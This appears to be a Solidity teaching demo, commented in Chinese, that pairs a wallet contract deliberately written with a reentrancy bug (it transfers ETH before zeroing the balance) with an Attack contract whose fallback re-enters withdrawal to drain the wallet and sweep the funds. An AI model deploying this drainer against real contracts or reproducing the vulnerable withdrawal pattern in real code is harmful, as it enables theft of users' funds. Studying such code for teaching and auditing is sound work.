// 攻擊合約：利用重入漏洞多次提領資金

contract WalletVulnerable {
    mapping(address => uint) public userBalances;
    
    // 接收轉入的 ETH
    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
    }

    // 漏洞函式：先轉帳再更新餘額，容易受到重入攻擊
    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        if (amountToWithdraw > 0) {
            // 漏洞：在更新狀態前呼叫 msg.sender.call，讓攻擊合約可重入調用 withdrawBalance
            (bool success, ) = msg.sender.call{value: amountToWithdraw}('');
            require(success, 'Transfer failed');
            userBalances[msg.sender] = 0;
        }
    }

    // 為方便示範，提供合約餘額查詢
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


// 攻擊合約
contract Attack {
    WalletVulnerable public vulnerableWallet;
    bool public attackComplete;
    uint public count;

    // 傳入受害 Wallet 合約的地址
    constructor(address _vulnerableWalletAddress) {
        vulnerableWallet = WalletVulnerable(_vulnerableWalletAddress);
    }

    // 攻擊入口，先存入一筆初始金額，再調用提領函式觸發漏洞
    function attack() public payable {
        require(msg.value >= 1 ether, 'Need at least 1 ether');
        // 存款至受害合約，增加攻擊者的餘額
        vulnerableWallet.deposit{value: msg.value}();
        // 發起首次提款，將觸發攻擊合約 fallback 進行重入攻擊
        vulnerableWallet.withdrawBalance();
    }

    // fallback 函式：在接收到 ETH 時自動重入 withdrawBalance
    fallback() external payable {
        if (address(vulnerableWallet).balance >= 1 ether && count < 5) {
            count++;
            vulnerableWallet.withdrawBalance();
        } else {
            attackComplete = true;
        }
    }

    // 提取攻擊合約上的所有 ETH，供攻擊者收割
    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
